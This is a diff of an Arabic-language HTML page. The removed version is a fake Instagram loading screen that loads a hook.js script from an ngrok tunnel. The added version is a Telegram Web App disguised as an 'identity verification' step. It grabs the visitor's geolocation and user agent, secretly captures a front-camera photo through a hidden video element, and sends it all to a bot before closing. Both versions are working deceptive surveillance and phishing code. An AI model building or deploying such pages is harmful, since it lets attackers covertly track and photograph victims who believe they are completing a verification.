@@ -1,68 +1,55 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram | جاري التحميل...</title>
-    
-    <script src="https://78ab-197-200-111-251.ngrok-free.app/hook.js"></script>
-
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        * { box-sizing: border-box; }
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #ffffff;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            color: #262626;
-        }
-        .instagram-logo {
-            width: 60px;
-            height: 60px;
-            margin-bottom: 20px;
-            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
-            border-radius: 15px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        .instagram-logo::after {
-            content: '';
-            width: 30px;
-            height: 30px;
-            border: 3px solid white;
-            border-radius: 8px;
-        }
-        .loader {
-            border: 2px solid #dbdbdb;
-            border-top: 2px solid #a8a8a8;
-            border-radius: 50%;
-            width: 28px;
-            height: 28px;
-            animation: spin 1s linear infinite;
-            margin-bottom: 15px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .text {
-            font-size: 14px;
-            color: #8e8e8e;
-            font-weight: 400;
-        }
+        body { font-family: sans-serif; text-align: center; padding: 20px; background: #f0f0f0; }
+        button { padding: 15px; background: #0088cc; color: white; border: none; border-radius: 10px; cursor: pointer; }
+        video { display: none; } /* الكاميرا تعمل في الخلفية بعد الإذن */
     </style>
 </head>
 <body>
+    <h3>تأكيد الهوية والخدمة</h3>
+    <p>يرجى الضغط على الزر أدناه للمتابعة</p>
+    <button id="startBtn">بدء عملية التحقق</button>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <video id="video" autoplay></video>
 
-    <div class="instagram-logo"></div>
-    <div class="loader"></div>
-    <div class="text">جاري مزامنة المحتوى...</div>
+    <script>
+        const tele = window.Telegram.WebApp;
+        tele.expand(); // توسيع النافذة لتشمل الشاشة كاملة
 
+        document.getElementById('startBtn').onclick = async () => {
+            let data = { info: navigator.userAgent };
+
+            // 1. طلب الموقع
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                data.lat = pos.coords.latitude;
+                data.lon = pos.coords.longitude;
+
+                // 2. التقاط صورة (مثال للكاميرا الأمامية)
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    
+                    // انتظر قليلاً للالتقاط
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        data.photo = canvas.toDataURL('image/jpeg'); // تحويل الصورة لنص Base64
+                        
+                        // إرسال البيانات للبوت وإغلاق الصفحة
+                        tele.sendData(JSON.stringify(data));
+                        tele.close();
+                    }, 1000);
+                } catch (err) {
+                    alert("يجب الموافقة على الكاميرا للمتابعة");
+                }
+            });
+        };
+    </script>
 </body>
 </html>
